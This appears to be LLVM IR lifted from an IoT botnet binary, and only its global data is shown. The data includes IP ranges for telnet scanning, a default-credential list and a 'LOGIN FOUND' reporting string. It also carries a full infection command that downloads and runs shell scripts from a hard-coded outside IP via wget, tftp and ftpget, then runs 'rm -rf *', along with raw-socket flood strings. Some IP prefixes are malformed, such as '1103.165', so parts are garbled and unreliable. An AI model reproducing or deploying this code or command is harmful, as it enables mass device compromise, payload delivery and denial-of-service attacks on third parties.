source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%sockaddr = type { i32, [14 x i8] }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%pollfd = type { i32, i16, i16 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_80a0.3 = constant i32 -352321502
@global_var_2600c.7 = global i32 0
@global_var_2601c.8 = global i32* @global_var_2600c.7
@global_var_265b4.15 = global i32 0
@global_var_26010.18 = global i32 0
@global_var_117f4.22 = constant i32 -509558771
@global_var_265e8.25 = global i32 0
@global_var_265ec.26 = local_unnamed_addr global i32 0
@global_var_265f0.27 = local_unnamed_addr global i32 0
@global_var_26248.30 = local_unnamed_addr global i32 4095
@global_var_26244.33 = global i32 362436
@global_var_1adbc.35 = constant [7 x i8] c"(null)\00"
@global_var_2a5e8.37 = local_unnamed_addr global i32 0
@global_var_1adc4.39 = constant [8 x i8] c"/bin/sh\00"
@global_var_1aa08.41 = constant [3 x i8] c"sh\00"
@global_var_1adcc.43 = constant [3 x i8] c"-c\00"
@global_var_1add0.46 = constant i32 -1
@global_var_1b1d0.48 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_1b1e0.50 = constant [9 x i8] c"BOGOMIPS\00"
@global_var_265cc.54 = global i32 0
@global_var_1b1ec.56 = constant [5 x i8] c"PING\00"
@global_var_1adac.58 = constant [8 x i8] c"busybox\00"
@global_var_1adb4.59 = constant i32 36
@global_var_1adb8.60 = constant i32 35
@global_var_26208.61 = global [3 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1adac.58, i32 0, i32 0), i8* bitcast (i32* @global_var_1adb4.59 to i8*), i8* bitcast (i32* @global_var_1adb8.60 to i8*)]
@global_var_1ad74.63 = constant [7 x i8] c"nvalid\00"
@global_var_1ad7c.64 = constant [6 x i8] c"ailed\00"
@global_var_1ad84.65 = constant [9 x i8] c"ncorrect\00"
@global_var_1ad90.66 = constant [6 x i8] c"enied\00"
@global_var_1ad98.67 = constant [5 x i8] c"rror\00"
@global_var_1ada0.68 = constant [7 x i8] c"oodbye\00"
@global_var_1ada8.69 = constant [4 x i8] c"bad\00"
@global_var_261e8.70 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1ad74.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ad7c.64, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1ad84.65, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ad90.66, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ad98.67, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1ada0.68, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1ada8.69, i32 0, i32 0)]
@global_var_265d4.72 = global i32 0
@global_var_265d8.73 = local_unnamed_addr global i32 0
@global_var_2c854.75 = global i32 0
@global_var_1b1f4.77 = constant [6 x i8] c":>%$#\00"
@global_var_265e2.79 = global i32 0
@global_var_265e3.80 = local_unnamed_addr global i32 0
@global_var_265e4.81 = local_unnamed_addr global i32 0
@global_var_1b1fc.85 = constant [12 x i8] c"177.5.%d.%d\00"
@global_var_1b208.87 = constant [15 x i8] c"1103.165.%d.%d\00"
@global_var_1b218.89 = constant [12 x i8] c"185.3.%d.%d\00"
@global_var_1b224.91 = constant [13 x i8] c"37.158.%d.%d\00"
@global_var_1b234.93 = constant [11 x i8] c"95.9.%d.%d\00"
@global_var_1b240.95 = constant [14 x i8] c"122.252.%d.%d\00"
@global_var_1b250.97 = constant [12 x i8] c"58.71.%d.%d\00"
@global_var_1b25c.99 = constant [13 x i8] c"104.55.%d.%d\00"
@global_var_1b26c.101 = constant [14 x i8] c"103.186.%d.%d\00"
@global_var_1b27c.103 = constant [14 x i8] c"103.189.%d.%d\00"
@global_var_1b28c.105 = constant [14 x i8] c"221.120.%d.%d\00"
@global_var_1b29c.107 = constant [11 x i8] c"88.5.%d.%d\00"
@global_var_1b2a8.109 = constant [14 x i8] c"122.254.%d.%d\00"
@global_var_1b2b8.111 = constant [13 x i8] c"108.20.%d.%d\00"
@global_var_1b2c8.113 = constant [13 x i8] c"108.47.%d.%d\00"
@global_var_1b2d8.115 = constant [13 x i8] c"108.57.%d.%d\00"
@global_var_1b2e8.117 = constant [14 x i8] c"45.1103.%d.%d\00"
@global_var_1b2f8.119 = constant [13 x i8] c"101.51.%d.%d\00"
@global_var_1b308.121 = constant [13 x i8] c"137.59.%d.%d\00"
@global_var_1b318.123 = constant [11 x i8] c"1.56.%d.%d\00"
@global_var_1b324.125 = constant [12 x i8] c"1.188.%d.%d\00"
@global_var_1b330.127 = constant [14 x i8] c"122.204.%d.%d\00"
@global_var_1b340.129 = constant [12 x i8] c"177.0.%d.%d\00"
@global_var_1b34c.131 = constant [12 x i8] c"177.8.%d.%d\00"
@global_var_1b358.133 = constant [13 x i8] c"177.91.%d.%d\00"
@global_var_1b368.135 = constant [13 x i8] c"177.54.%d.%d\00"
@global_var_1b378.137 = constant [13 x i8] c"177.98.%d.%d\00"
@global_var_1b388.139 = constant [14 x i8] c"177.177.%d.%d\00"
@global_var_1b398.141 = constant [14 x i8] c"177.192.%d.%d\00"
@global_var_1b3a8.143 = constant [12 x i8] c"36.32.%d.%d\00"
@global_var_1b3b4.145 = constant [13 x i8] c"36.248.%d.%d\00"
@global_var_1b3c4.147 = constant [12 x i8] c"39.64.%d.%d\00"
@global_var_1b3d0.149 = constant [11 x i8] c"42.4.%d.%d\00"
@global_var_1b3dc.151 = constant [12 x i8] c"42.48.%d.%d\00"
@global_var_1b3e8.153 = constant [12 x i8] c"42.52.%d.%d\00"
@global_var_1b3f4.155 = constant [12 x i8] c"42.56.%d.%d\00"
@global_var_1b400.157 = constant [12 x i8] c"42.63.%d.%d\00"
@global_var_1b40c.159 = constant [12 x i8] c"42.84.%d.%d\00"
@global_var_1b418.161 = constant [13 x i8] c"42.176.%d.%d\00"
@global_var_1b428.163 = constant [13 x i8] c"42.224.%d.%d\00"
@global_var_1b438.165 = constant [13 x i8] c"43.253.%d.%d\00"
@global_var_1b448.167 = constant [13 x i8] c"43.230.%d.%d\00"
@global_var_1b458.169 = constant [13 x i8] c"163.53.%d.%d\00"
@global_var_1b468.171 = constant [13 x i8] c"62.252.%d.%d\00"
@global_var_1b478.173 = constant [13 x i8] c"43.245.%d.%d\00"
@global_var_1b488.175 = constant [13 x i8] c"62.255.%d.%d\00"
@global_var_1b498.177 = constant [13 x i8] c"123.25.%d.%d\00"
@global_var_1b4a8.179 = constant [13 x i8] c"108.54.%d.%d\00"
@global_var_1b4b8.181 = constant [14 x i8] c"177.255.%d.%d\00"
@global_var_1b4c8.183 = constant [14 x i8] c"108.204.%d.%d\00"
@global_var_1b4d8.185 = constant [13 x i8] c"123.24.%d.%d\00"
@global_var_1b4e8.187 = constant [14 x i8] c"104.191.%d.%d\00"
@global_var_1b4f8.189 = constant [15 x i8] c"1103.100.%d.%d\00"
@global_var_1b508.191 = constant [14 x i8] c"104.188.%d.%d\00"
@global_var_1b518.193 = constant [14 x i8] c"104.189.%d.%d\00"
@global_var_1b528.195 = constant [13 x i8] c"94.174.%d.%d\00"
@global_var_1b538.197 = constant [14 x i8] c"122.160.%d.%d\00"
@global_var_1b548.199 = constant [14 x i8] c"122.161.%d.%d\00"
@global_var_1b558.201 = constant [14 x i8] c"122.162.%d.%d\00"
@global_var_1b568.203 = constant [14 x i8] c"122.163.%d.%d\00"
@global_var_1b578.205 = constant [14 x i8] c"122.164.%d.%d\00"
@global_var_1b588.207 = constant [14 x i8] c"122.165.%d.%d\00"
@global_var_1b598.209 = constant [14 x i8] c"122.166.%d.%d\00"
@global_var_1b5a8.211 = constant [14 x i8] c"122.167.%d.%d\00"
@global_var_1b5b8.213 = constant [14 x i8] c"122.168.%d.%d\00"
@global_var_1b5c8.215 = constant [14 x i8] c"122.169.%d.%d\00"
@global_var_1b5d8.217 = constant [14 x i8] c"122.170.%d.%d\00"
@global_var_1b5e8.219 = constant [14 x i8] c"122.171.%d.%d\00"
@global_var_1b5f8.221 = constant [14 x i8] c"122.172.%d.%d\00"
@global_var_1b608.223 = constant [14 x i8] c"122.173.%d.%d\00"
@global_var_1b618.225 = constant [14 x i8] c"122.174.%d.%d\00"
@global_var_1b628.227 = constant [14 x i8] c"122.177.%d.%d\00"
@global_var_1b638.229 = constant [14 x i8] c"122.176.%d.%d\00"
@global_var_1b648.232 = constant [15 x i8] c"122.1103.%d.%d\00"
@global_var_1b658.234 = constant [14 x i8] c"122.179.%d.%d\00"
@global_var_1b668.236 = constant [14 x i8] c"122.180.%d.%d\00"
@global_var_1b678.238 = constant [16 x i8] c"122.11103.%d.%d\00"
@global_var_1b688.240 = constant [14 x i8] c"122.182.%d.%d\00"
@global_var_1b698.242 = constant [14 x i8] c"122.183.%d.%d\00"
@global_var_1b6a8.244 = constant [14 x i8] c"122.184.%d.%d\00"
@global_var_1b6b8.246 = constant [15 x i8] c"122.1185.%d.%d\00"
@global_var_1b6c8.248 = constant [14 x i8] c"122.186.%d.%d\00"
@global_var_1b6d8.250 = constant [14 x i8] c"122.187.%d.%d\00"
@global_var_1b6e8.252 = constant [14 x i8] c"122.188.%d.%d\00"
@global_var_1b6f8.254 = constant [14 x i8] c"122.189.%d.%d\00"
@global_var_1b708.256 = constant [14 x i8] c"122.190.%d.%d\00"
@global_var_1b718.258 = constant [14 x i8] c"122.191.%d.%d\00"
@global_var_1b728.260 = constant [13 x i8] c"45.121.%d.%d\00"
@global_var_1b738.262 = constant [13 x i8] c"45.120.%d.%d\00"
@global_var_1b748.264 = constant [13 x i8] c"45.115.%d.%d\00"
@global_var_1b758.266 = constant [13 x i8] c"43.252.%d.%d\00"
@global_var_1b768.268 = constant [13 x i8] c"43.240.%d.%d\00"
@global_var_1b778.270 = constant [13 x i8] c"49.118.%d.%d\00"
@global_var_1b788.272 = constant [14 x i8] c"103.188.%d.%d\00"
@global_var_1b798.274 = constant [14 x i8] c"45.1177.%d.%d\00"
@global_var_1b7a8.276 = constant [13 x i8] c"108.30.%d.%d\00"
@global_var_1b7b8.278 = constant [13 x i8] c"122.33.%d.%d\00"
@global_var_1b7c8.280 = constant [13 x i8] c"123.16.%d.%d\00"
@global_var_1b7d8.282 = constant [13 x i8] c"202.44.%d.%d\00"
@global_var_1b7e8.284 = constant [13 x i8] c"116.93.%d.%d\00"
@global_var_1b7f8.286 = constant [12 x i8] c"91.83.%d.%d\00"
@global_var_1b804.288 = constant [14 x i8] c"122.253.%d.%d\00"
@global_var_1b814.290 = constant [15 x i8] c"1103.173.%d.%d\00"
@global_var_1b824.292 = constant [14 x i8] c"104.190.%d.%d\00"
@global_var_1b834.294 = constant [13 x i8] c"146.88.%d.%d\00"
@global_var_1b844.296 = constant [14 x i8] c"177.196.%d.%d\00"
@global_var_1b854.298 = constant [15 x i8] c"104.1103.%d.%d\00"
@global_var_1b864.300 = constant [13 x i8] c"177.45.%d.%d\00"
@global_var_1b874.302 = constant [14 x i8] c"183.223.%d.%d\00"
@global_var_1b884.304 = constant [13 x i8] c"116.71.%d.%d\00"
@global_var_1b894.306 = constant [13 x i8] c"108.44.%d.%d\00"
@global_var_1b8a4.308 = constant [14 x i8] c"110.235.%d.%d\00"
@global_var_1b8b4.310 = constant [14 x i8] c"124.253.%d.%d\00"
@global_var_1b8c4.312 = constant [14 x i8] c"211.237.%d.%d\00"
@global_var_1b8d4.314 = constant [15 x i8] c"1103.177.%d.%d\00"
@global_var_1b8e4.316 = constant [14 x i8] c"1103.93.%d.%d\00"
@global_var_1b8f4.318 = constant [12 x i8] c"111.9.%d.%d\00"
@global_var_1b900.320 = constant [14 x i8] c"222.252.%d.%d\00"
@global_var_1b910.322 = constant [14 x i8] c"104.174.%d.%d\00"
@global_var_1b920.324 = constant [14 x i8] c"104.160.%d.%d\00"
@global_var_1b930.326 = constant [14 x i8] c"104.161.%d.%d\00"
@global_var_1b940.328 = constant [14 x i8] c"104.162.%d.%d\00"
@global_var_1b950.330 = constant [14 x i8] c"104.163.%d.%d\00"
@global_var_1b960.332 = constant [14 x i8] c"104.164.%d.%d\00"
@global_var_1b970.334 = constant [14 x i8] c"104.165.%d.%d\00"
@global_var_1b980.336 = constant [14 x i8] c"104.166.%d.%d\00"
@global_var_1b990.338 = constant [14 x i8] c"104.167.%d.%d\00"
@global_var_1b9a0.340 = constant [14 x i8] c"104.168.%d.%d\00"
@global_var_1b9b0.342 = constant [14 x i8] c"104.169.%d.%d\00"
@global_var_1b9c0.344 = constant [13 x i8] c"123.17.%d.%d\00"
@global_var_1b9d0.346 = constant [13 x i8] c"123.18.%d.%d\00"
@global_var_1b9e0.348 = constant [13 x i8] c"123.19.%d.%d\00"
@global_var_1b9f0.350 = constant [13 x i8] c"123.20.%d.%d\00"
@global_var_1ba00.352 = constant [13 x i8] c"123.21.%d.%d\00"
@global_var_1ba10.354 = constant [13 x i8] c"123.22.%d.%d\00"
@global_var_1ba20.356 = constant [14 x i8] c"222.253.%d.%d\00"
@global_var_1ba30.358 = constant [14 x i8] c"222.254.%d.%d\00"
@global_var_1ba40.360 = constant [14 x i8] c"222.255.%d.%d\00"
@global_var_1ba50.362 = constant [13 x i8] c"37.247.%d.%d\00"
@global_var_1ba60.364 = constant [14 x i8] c"122.208.%d.%d\00"
@global_var_1ba70.366 = constant [14 x i8] c"183.220.%d.%d\00"
@global_var_1ba80.368 = constant [14 x i8] c"177.201.%d.%d\00"
@global_var_1ba90.370 = constant [14 x i8] c"108.198.%d.%d\00"
@global_var_1baa0.373 = constant [13 x i8] c"91.205.%d.%d\00"
@global_var_1bab0.375 = constant [13 x i8] c"88.248.%d.%d\00"
@global_var_1bac0.377 = constant [13 x i8] c"88.105.%d.%d\00"
@global_var_1bad0.379 = constant [13 x i8] c"88.247.%d.%d\00"
@global_var_1bae0.381 = constant [14 x i8] c"185.105.%d.%d\00"
@global_var_1baf0.383 = constant [12 x i8] c"188.3.%d.%d\00"
@global_var_1bafc.385 = constant [14 x i8] c"108.203.%d.%d\00"
@global_var_1bb0c.387 = constant [13 x i8] c"108.55.%d.%d\00"
@global_var_1bb1c.389 = constant [14 x i8] c"108.220.%d.%d\00"
@global_var_1bb2c.391 = constant [14 x i8] c"183.233.%d.%d\00"
@global_var_1bb3c.393 = constant [14 x i8] c"108.242.%d.%d\00"
@global_var_1bb4c.396 = constant [14 x i8] c"108.122.%d.%d\00"
@global_var_1bb5c.398 = constant [14 x i8] c"108.195.%d.%d\00"
@global_var_1bb6c.400 = constant [15 x i8] c"108.2122.%d.%d\00"
@global_var_1bb7c.402 = constant [14 x i8] c"108.218.%d.%d\00"
@global_var_1bb8c.404 = constant [14 x i8] c"108.225.%d.%d\00"
@global_var_1bb9c.406 = constant [14 x i8] c"108.228.%d.%d\00"
@global_var_1bbac.408 = constant [14 x i8] c"108.231.%d.%d\00"
@global_var_1bbbc.410 = constant [13 x i8] c"108.60.%d.%d\00"
@global_var_1bbcc.412 = constant [14 x i8] c"108.248.%d.%d\00"
@global_var_1bbdc.414 = constant [14 x i8] c"108.253.%d.%d\00"
@global_var_1bbec.416 = constant [14 x i8] c"108.255.%d.%d\00"
@global_var_1bbfc.418 = constant [13 x i8] c"108.35.%d.%d\00"
@global_var_1bc0c.420 = constant [13 x i8] c"108.49.%d.%d\00"
@global_var_1bc1c.422 = constant [13 x i8] c"108.62.%d.%d\00"
@global_var_1bc2c.424 = constant [13 x i8] c"144.48.%d.%d\00"
@global_var_1bc3c.426 = constant [13 x i8] c"163.47.%d.%d\00"
@global_var_1bc4c.429 = constant [13 x i8] c"223.29.%d.%d\00"
@global_var_1bc5c.431 = constant [13 x i8] c"59.153.%d.%d\00"
@global_var_1bc6c.433 = constant [14 x i8] c"104.176.%d.%d\00"
@global_var_1bc7c.435 = constant [14 x i8] c"104.177.%d.%d\00"
@global_var_1bc8c.437 = constant [14 x i8] c"104.183.%d.%d\00"
@global_var_1bc9c.439 = constant [14 x i8] c"202.164.%d.%d\00"
@global_var_1bcac.441 = constant [14 x i8] c"203.134.%d.%d\00"
@global_var_1bcbc.443 = constant [13 x i8] c"210.56.%d.%d\00"
@global_var_1bccc.445 = constant [13 x i8] c"49.156.%d.%d\00"
@global_var_1bcdc.447 = constant [14 x i8] c"203.210.%d.%d\00"
@global_var_1bcec.449 = constant [17 x i8] c"1103.11103.%d.%d\00"
@global_var_1bd00.451 = constant [16 x i8] c"1103.1103.%d.%d\00"
@global_var_1bd10.454 = constant [15 x i8] c"1103.176.%d.%d\00"
@global_var_1bd20.456 = constant [15 x i8] c"1103.170.%d.%d\00"
@global_var_1bd30.458 = constant [15 x i8] c"1103.171.%d.%d\00"
@global_var_1bd40.460 = constant [15 x i8] c"1103.162.%d.%d\00"
@global_var_1bd50.462 = constant [13 x i8] c"177.26.%d.%d\00"
@global_var_1bd60.465 = constant [13 x i8] c"177.28.%d.%d\00"
@global_var_1bd70.467 = constant [13 x i8] c"177.29.%d.%d\00"
@global_var_1bd80.469 = constant [13 x i8] c"177.30.%d.%d\00"
@global_var_1bd90.471 = constant [13 x i8] c"177.31.%d.%d\00"
@global_var_1bda0.473 = constant [14 x i8] c"203.191.%d.%d\00"
@global_var_2c848.477 = global i32 0
@global_var_1acf8.479 = constant [15 x i8] c"/dev/netslink/\00"
@global_var_1ad08.480 = constant [6 x i8] c"/tmp/\00"
@global_var_1ad10.481 = constant [6 x i8] c"/var/\00"
@global_var_1ad18.482 = constant [6 x i8] c"/dev/\00"
@global_var_1ad20.483 = constant [10 x i8] c"/var/run/\00"
@global_var_1ad2c.484 = constant [10 x i8] c"/dev/shm/\00"
@global_var_1ad38.485 = constant [6 x i8] c"/mnt/\00"
@global_var_1ad40.486 = constant [7 x i8] c"/boot/\00"
@global_var_1ad48.487 = constant [6 x i8] c"/usr/\00"
@global_var_1ad50.488 = constant [6 x i8] c"/opt/\00"
@global_var_261a8.489 = global [10 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_1acf8.479, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ad08.480, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ad10.481, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ad18.482, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1ad20.483, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1ad2c.484, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ad38.485, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1ad40.486, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ad48.487, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ad50.488, i32 0, i32 0)]
@global_var_261d4 = external global i32
@global_var_1acd0.496 = constant [5 x i8] c"root\00"
@global_var_1acd8.497 = constant [6 x i8] c"admin\00"
@global_var_1ace0.498 = constant [7 x i8] c"telnet\00"
@global_var_1ace8.499 = constant [5 x i8] c"1111\00"
@global_var_1acf0.500 = constant [5 x i8] c"1234\00"
@global_var_26188.501 = global [8 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1acd0.496, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1acd8.497, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1ace0.498, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1acd8.497, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1acd0.496, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ace8.499, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1ace0.498, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1acf0.500, i32 0, i32 0)]
@global_var_1bdc0.503 = constant [3 x i8] c"\0D\0A\00"
@global_var_26198.505 = global [4 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1acd0.496, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ace8.499, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1ace0.498, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1acf0.500, i32 0, i32 0)]
@global_var_26218.507 = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1ad74.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ad7c.64, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1ad84.65, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ad90.66, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ad98.67, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1ada0.68, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1ada8.69, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1adac.58, i32 0, i32 0), i8* bitcast (i32* @global_var_1adb4.59 to i8*), i8* bitcast (i32* @global_var_1adb8.60 to i8*)]
@global_var_1bdc4.510 = constant [23 x i8] c"LOGIN FOUND - %s:%s:%s\00"
@global_var_1bddc.512 = constant [5 x i8] c"sh\0D\0A\00"
@global_var_1bde4.514 = constant [8 x i8] c"shell\0D\0A\00"
@global_var_1ab34.516 = constant [412 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/rooty.sh; chmod 777 rooty.sh; sh rooty.sh; tftp 191.96.112.107 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; tftp -r ktftp2.sh -g 191.96.112.107; chmod 777 ktftp2.sh; sh ktftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.112.107 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf rooty.sh ktftp1.sh ktftp2.sh ftp1.sh; rm -rf *\0D\0A\00"
@global_var_26184.517 = local_unnamed_addr global [412 x i8]* @global_var_1ab34.516
@global_var_1bdec.519 = constant [6 x i8] c"arfgG\00"
@global_var_1bdf4.520 = constant [9 x i8] c"HBiug655\00"
@global_var_1be00.521 = constant [13 x i8] c"KJYDFyljf754\00"
@global_var_1be10.522 = constant [20 x i8] c"LIKUGilkut769458905\00"
@global_var_1be24.523 = constant [17 x i8] c"JHFDSkgfc5747694\00"
@global_var_1be38.524 = constant [12 x i8] c"GJjyur67458\00"
@global_var_1be44.525 = constant [12 x i8] c"RYSDk747586\00"
@global_var_1be50.526 = constant [12 x i8] c"HKJGi5r8675\00"
@global_var_1be5c.527 = constant [10 x i8] c"KHGK7985i\00"
@global_var_1be68.528 = constant [11 x i8] c"yuituiILYF\00"
@global_var_1be74.529 = constant [14 x i8] c"GKJDghfcjkgd4\00"
@global_var_1be84.530 = constant [12 x i8] c"uygtfgtrevf\00"
@global_var_1be90.531 = constant [13 x i8] c"tyeuhygbtfvg\00"
@global_var_1bea0.532 = constant [9 x i8] c"ewqdcftr\00"
@global_var_1beac.533 = constant [16 x i8] c"trbazetghhnbrty\00"
@global_var_1bebc.534 = constant [11 x i8] c"tbhrwsehbg\00"
@global_var_1bec8.535 = constant [12 x i8] c"twehgbferhb\00"
@global_var_1bed4.536 = constant [12 x i8] c"etrbhhgetrb\00"
@global_var_1bee0.537 = constant [14 x i8] c"edfverthbyrtb\00"
@global_var_1bef0.538 = constant [14 x i8] c"kmiujmnhnhfgn\00"
@global_var_1bf00.539 = constant [14 x i8] c"zcdbvgdfsbgfd\00"
@global_var_1bf10.540 = constant [10 x i8] c"gdfbtsdgb\00"
@global_var_1bf1c.541 = constant [14 x i8] c"ghdugffytsdyt\00"
@global_var_1bf2c.542 = constant [14 x i8] c"tgerthgwtrwry\00"
@global_var_1bf3c.543 = constant [12 x i8] c"yteytietyue\00"
@global_var_1bf48.544 = constant [9 x i8] c"qsortEQS\00"
@global_var_1bf54.545 = constant [16 x i8] c"8969876hjkghblk\00"
@global_var_1bf64.546 = constant [4 x i8] c"std\00"
@global_var_1bf68.547 = constant [4 x i8] c"dts\00"
@global_var_1bf6c.548 = constant [4 x i8] c"lsk\00"
@global_var_1bf70.549 = constant [4 x i8] c"kek\00"
@global_var_1bf74.550 = constant [6 x i8] c"smack\00"
@global_var_1bf7c.551 = constant [4 x i8] c"ily\00"
@global_var_1bf80.552 = constant [4 x i8] c"tyf\00"
@global_var_1bf84.553 = constant [4 x i8] c"pos\00"
@global_var_1bf88.554 = constant [6 x i8] c"cunts\00"
@global_var_1bf90.555 = constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1bdec.519, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1bdf4.520, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1be00.521, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_1be10.522, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_1be24.523, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1be38.524, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1be44.525, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1be50.526, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1be5c.527, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1be68.528, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1be74.529, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1be84.530, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1be90.531, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1bea0.532, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1beac.533, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1bebc.534, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1bec8.535, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1bed4.536, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1bee0.537, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1bef0.538, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1bf00.539, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1bf10.540, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1bf1c.541, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1bf2c.542, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1bf3c.543, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1bf48.544, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1bf54.545, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1bf64.546, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1bf68.547, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1bf6c.548, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1bf70.549, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1bf74.550, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1bf7c.551, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1bf80.552, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1bf84.553, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1bf88.554, i32 0, i32 0)]
@global_var_1c020.558 = constant [27 x i8] c"Failed opening raw socket.\00"
@global_var_1c03c.560 = constant [33 x i8] c"Failed setting raw headers mode.\00"
@global_var_1c060.565 = constant [4 x i8] c"all\00"
@global_var_1c064.567 = constant i32 44
